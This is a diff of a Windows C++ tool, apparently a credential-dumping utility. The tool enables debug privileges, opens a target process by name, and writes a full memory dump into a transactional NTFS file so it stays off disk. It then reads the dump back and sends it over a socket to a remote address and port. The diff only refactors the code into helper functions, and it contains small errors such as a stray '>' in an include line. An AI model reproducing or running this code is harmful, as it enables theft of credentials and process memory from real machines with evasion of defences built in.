@@ -9,6 +9,7 @@
 #include <psapi.h>
 #include <ktmw32.h>
 #include <winsock2.h>
+#include <string.h>>
 
 #pragma comment (lib, "dbghelp") 
 #pragma comment(lib, "KtmW32.lib")
@@ -18,6 +19,7 @@
 
 
 
+#define SIZE 200000000
 
 int Send_via_sokcet(char* ip4, int port, LPVOID buffer, int size)
 {
@@ -104,7 +106,8 @@ int Send_via_sokcet(char* ip4, int port, LPVOID buffer, int size)
 	return 0;
 }
 
-bool enableDebugPrivileges() {
+bool enableDebugPrivileges() 
+{
 
 	HANDLE hcurrent = GetCurrentProcess();
 
@@ -223,6 +226,14 @@ int save_dump_to_memory(LPVOID mem, HANDLE file, SIZE_T size)
 	DWORD bytesRead;
 	ReadFile(file, mem, size, &bytesRead, NULL);
 	std::cout << "read " << bytesRead << " from the transacted file in memory \n";
+
+	if (!bytesRead)
+	{
+		std::cout << "could not save dump to memory error code " << GetLastError() << "\n";
+		system("pause");
+		exit(0);
+	}
+
 	return bytesRead;
 }
 
@@ -239,96 +250,102 @@ LPVOID AllocateMemoryToDump(HANDLE process, SIZE_T size)
 	return(mem);
 }
 
-
-
-int main(int argc, char **argv)
+void validate_arguments(int argc,char **argv)
 {
-
 	// Validate the parameters
 	if (argc != 4) {
 		std::cout << "usage: " << argv[0] << "<server_address> <port> <process name> \n";
-		return 1;
+		exit (0);
+	}
+}
+
+void create_file_path(char *file_name)
+{
+	if (!ExpandEnvironmentStrings("%temp%", file_name, 150))
+	{
+		std::cout << "could not expand envirmoent variable error code " << GetLastError() << "\n";
 	}
 
-	char *ip = argv[1];
-	int port = atoi(argv[2]);
-	char* proc_name = argv[3];
+	strcat_s(file_name, 150,"\\trans_file");
 
-	std::cout << "connecting to " << ip << " in port "<< port <<  " locating process " << proc_name << "\n";
-	enableDebugPrivileges();
-	SIZE_T size = 200000000;//get_maximum_process_size(process);
+	std::cout << "file path " << file_name << "\n";
+}
 
-	DWORD pid = FindProcessId(proc_name);
-
-	HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE | THREAD_ALL_ACCESS, FALSE, pid);
-	if (!process)
+void open_process(DWORD pid,PHANDLE process)
+{
+	*process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE | THREAD_ALL_ACCESS, FALSE, pid);
+	if (!*process)
 	{
 		std::cout << "could not open process handle error code " << GetLastError() << "\n";
 		system("pause");
 		exit(0);
 	}
+}
 
-	HANDLE ReadPipe;
-	HANDLE WritePipe;
-
-
-
-	char file_name[150];
-	
-	if (!ExpandEnvironmentStrings("%temp%", file_name, 150))
+void create_transactional_ntfs(char* file_name,DWORD desiredAccess,DWORD dwCreationDisposition, PHANDLE trans_Handle, PHANDLE trans_file)
+{
+	if (*trans_Handle == NULL)
 	{
-		std::cout << "could not expand envirmoent variable error code " << GetLastError() << "\n";
-	}
-	
-	strcat_s(file_name, "\\trans_file");
-
-	std::cout << "file path " << file_name << "\n";
-
-	HANDLE trans_Handle = CreateTransaction(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
-	if (trans_Handle == INVALID_HANDLE_VALUE)
-	{
-		std::cout << "Error CreateTransaction(): GLE= " << GetLastError() << "\n";
-		exit(1);
+		*trans_Handle = CreateTransaction(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+		if (trans_Handle == INVALID_HANDLE_VALUE)
+		{
+			std::cout << "Error CreateTransaction(): GLE= " << GetLastError() << "\n";
+			exit(1);
+		}
 	}
 
-	USHORT a = 0xFFFF;
-	HANDLE trans_file = CreateFileTransactedA(file_name, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL, trans_Handle, &a, NULL);
-	if (trans_file == INVALID_HANDLE_VALUE)
+	USHORT PUSHMINIVERSION = 0xFFFF;
+	*trans_file = CreateFileTransactedA(file_name, desiredAccess, 0, nullptr, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, NULL,*trans_Handle, &PUSHMINIVERSION, NULL);
+	if (*trans_file == INVALID_HANDLE_VALUE)
 	{
 		std::cout << "Error CreateFileTransactedA(): GLE= " << GetLastError() << "\n";
 		exit(1);
 	}
 
+}
+
+
+int main(int argc, char **argv)
+{
+
+	validate_arguments(argc, argv);
+	
+	char *ip = argv[1];
+	int port = atoi(argv[2]);
+	char* proc_name = argv[3];
+	HANDLE process;
+	DWORD pid;
+	HANDLE trans_Handle = 0;
+	HANDLE trans_file;
+	LPVOID mem;
+	char file_name[150];
+
+	std::cout << "connecting to " << ip << " in port "<< port <<  " locating process " << proc_name << "\n";
+
+	enableDebugPrivileges();
+
+	pid = FindProcessId(proc_name);
+
+	open_process(pid, &process);
+
+	create_file_path(file_name);
+	
+	create_transactional_ntfs(file_name,GENERIC_WRITE, CREATE_ALWAYS, &trans_Handle, &trans_file);
+	
 	WriteFullDump(process, trans_file);
 
 	CloseHandle(trans_file);
-	trans_file = CreateFileTransactedA(file_name, GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL, trans_Handle, &a, NULL);
-	if (trans_file == INVALID_HANDLE_VALUE)
-	{
-		std::cout << "Error CreateFileTransactedA(): GLE= " << GetLastError() << "\n";
-		exit(1);
-	}
 
-	LPVOID mem = AllocateMemoryToDump(process, size);
+	create_transactional_ntfs(file_name, GENERIC_READ, OPEN_EXISTING, &trans_Handle, &trans_file);
 
-	if (!mem)
-	{
-		std::cout << "could not open file handle error code " << GetLastError() << "\n";
-		system("pause");
-		exit(0);
-	}
+	mem = AllocateMemoryToDump(process, SIZE);
 
-	int dump_size = save_dump_to_memory(mem, trans_file, size);
-	if (!dump_size)
-	{
-		std::cout << "could not save dump to memory error code " << GetLastError() << "\n";
-		system("pause");
-		exit(0);
-	}
-
+	int dump_size = save_dump_to_memory(mem, trans_file, SIZE);
 
 	Send_via_sokcet(ip, port, mem, dump_size);
+
 	CloseHandle(trans_Handle);
+
 	CloseHandle(trans_file);
 
 
